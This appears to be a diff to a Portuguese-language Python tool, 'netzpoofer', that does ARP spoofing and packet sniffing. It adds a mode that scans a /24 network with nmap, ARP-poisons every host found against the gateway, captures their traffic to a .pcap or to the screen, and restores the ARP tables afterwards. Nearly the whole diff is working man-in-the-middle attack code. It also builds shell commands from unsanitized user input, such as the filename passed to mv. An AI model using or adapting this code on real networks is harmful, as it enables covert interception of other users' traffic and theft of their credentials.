@@ -88,16 +88,27 @@ def netzpoofer():
         print('[*] Então o seu endereço de rede é 192.168.0.0')
         net = input('Endereço de rede: ')
 
-    print('[*] Todos os alvos possíveis na rede: ')
-    os.system("nmap -sn " + net + '/24'" | grep for | cut -f 5 -d ' '")
-    print('-------------------------------------------------------------------')
-    target_ip = input('[?] IP do alvo: ')
-    if(target_ip == '?'):
-        print('[*] Aqui é onde você seleciona o endereço de IP do seu alvo')
-        print('[*] O IP do alvo provavelmente está na lista acima')
-        print('[*] O IP do alvo deve estar conectado a sua rede')
-        target_ip = input('IP do alvo: ')
-
+    print('[*] Deseja interceptar todos os IPs da rede?')
+    gate = input('[Y/N]')
+    if(gate == 'Y'):
+        target_ip = '*'
+        all_target = []
+        nmap_pop = os.popen("nmap -sn " + net + '/24'" | grep for | cut -f 5 -d ' '").read()  
+        all_target = nmap_pop.split('\n')
+        all_target.pop(0)
+        all_target.pop(-1)
+        all_target.pop(-1)
+    else:
+        print('[*] Todos os alvos possíveis na rede: ')
+        os.system("nmap -sn " + net + '/24'" | grep for | cut -f 5 -d ' '")
+        print('-------------------------------------------------------------------')
+        target_ip = input('[?]IP do alvo: ')
+        if(target_ip == '?'):
+            print('[*] Aqui é onde você seleciona o endereço de IP do seu alvo')
+            print('[*] O IP do alvo provavelmente está na lista acima')
+            print('[*] O IP do alvo deve estar conectado a sua rede')
+            target_ip = input('IP do alvo: ')
+        
     print('[*] Possíveis gateways na sua rede: ')
     os.system("route -n")
     print('-------------------------------------------------------------------')
@@ -107,19 +118,29 @@ def netzpoofer():
         print('[*] Em uma rede doméstica simples, o gateway é o roteador')
         print('[*] Se o seu IP é 192.168.0.101 então o seu gateway provavelmente é 192.168.0.1')
         gateway_ip = input('IP do gateway: ')
-
     print('[*] Salvar o tráfego interceptado em um arquivo .pcap?')
     gate = input('[Y/N] ')
     if(gate == 'Y'):
         packet_count = int(input('Número de pacotes a serer interceptados: '))    
         output_filename = input('Nome do arquivo de saída: ')
-        limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename)
+        if(target_ip == '*'):
+            for ip in all_target:
+                spoof_func(interface, gateway_ip, ip)
+            multi_limit_sniff(interface, gateway_ip, all_target, packet_count, output_filename)
+        else:
+            spoof_func(interface, gateway_ip, target_ip)
+            limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename)
     else:
         os.system("clear")
-        constant_sniff(interface, gateway_ip, target_ip)
+        if(target_ip == '*'):
+            for ip in all_target:
+                spoof_func(interface, gateway_ip, ip)
+            multi_constant_sniff(interface, gateway_ip, all_target)
+        else:
+            spoof_func(interface, gateway_ip, target_ip)
+            constant_sniff(interface, gateway_ip, target_ip)
 
-def limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename):
-
+def spoof_func(interface, gateway_ip, target_ip):
     conf.iface = interface    
     conf.verb = 0
     print ('[*] Configurando %s' %interface)
@@ -140,50 +161,67 @@ def limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename)
         print ('[*] O alvo %s está em %s' % (target_ip, target_mac))      
 
     poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))      
-    poison_thread.start()    
+    poison_thread.start()
+    return gateway_mac, target_mac
 
+def pre_restore(gateway_ip, target_ip):
+    gateway_mac = get_mac(gateway_ip)
+    target_mac = get_mac(target_ip)
+    print('[*] Restaurando alvos')
+    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+
+def multi_restore(gateway_ip, all_target):
+    gateway_mac = get_mac(gateway_ip)
+    for ip in all_target:
+        target_mac = get_mac(ip)
+        print('[*] Restaurando alvo %s' %ip)
+        send(ARP(op = 2, psrc = gateway_ip, pdst = ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateway_mac), count = 5)     
+        send(ARP(op = 2, psrc = ip, pdst = gateway_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = target_mac), count = 5)      
+    print('[*] Terminando o processo')
+    os.kill(os.getpid(), signal.SIGINT) 
+
+def limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename):  
     try:      
         print ('[*] Iniciando o sniffer para %d pacotes' % packet_count)
         bpf_filter = 'ip host %s' %target_ip
         packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)
         wrpcap(output_filename, packets)
         os.system("mv " + output_filename + " ./Files") 
-        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)     
+        pre_restore(gateway_ip, target_ip)     
 
     except KeyboardInterrupt:      
-        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)     
+        pre_restore(gateway_ip, target_ip)          
         sys.exit(0)
 
-def constant_sniff(interface, gateway_ip, target_ip):
-    conf.iface = interface    
-    conf.verb = 0
-    print ('[*] Configurando %s' %interface)
-    gateway_mac = get_mac(gateway_ip)       
-
-    if gateway_mac is None:    
-        print ('[!!!] Erro em adquirir o MAC do gateway. Encerrando.')
-        sys.exit(0)
-    else:
-        print ('[*] Gateway %s está em %s') % (gateway_ip, gateway_mac)      
-
-    target_mac = get_mac(target_ip)   
-
-    if target_mac is None:     
-        print ('[!!!] Erro em adquirir o MAC do gateway. Encerrando.')
-        sys.exit(0)
-    else:
-        print ('[*] O alvo %s está em %s' % (target_ip, target_mac))      
-
-    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))      
-    poison_thread.start()    
-
+def constant_sniff(interface, gateway_ip, target_ip): 
     try:      
         print ('[*] Iniciando o sniffer de pacotes')
         bpf_filter = 'ip host %s' %target_ip
         while True:
             packets = sniff(count = 1, filter = bpf_filter, iface = interface)
-            #packets = sniff(count = 1, prn = lambda x: x.show(), filter = bpf_filter, iface = interface, store = 0)
             packets.show() 
     except KeyboardInterrupt:      
-        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+        pre_restore(gateway_ip, target_ip) 
+        sys.exit(0)
+
+def multi_limit_sniff(interface, gateway_ip, all_target, packet_count, output_filename):  
+    try:      
+        print ('[*] Iniciando o sniffer para %d pacotes' % packet_count)
+        packets = sniff(count = packet_count, iface = interface)
+        wrpcap(output_filename, packets)
+        os.system("mv " + output_filename + " ./Files")  
+        multi_restore(gateway_ip, all_target)
+
+    except KeyboardInterrupt: 
+        multi_restore(gateway_ip, all_target)              
+        sys.exit(0)
+
+def multi_constant_sniff(interface, gateway_ip, all_target): 
+    try:      
+        print ('[*] Iniciando o sniffer de pacotes')
+        while True:
+            packets = sniff(count = 1, iface = interface)
+            packets.show() 
+    except KeyboardInterrupt:      
+        multi_restore(gateway_ip, all_target) 
         sys.exit(0)
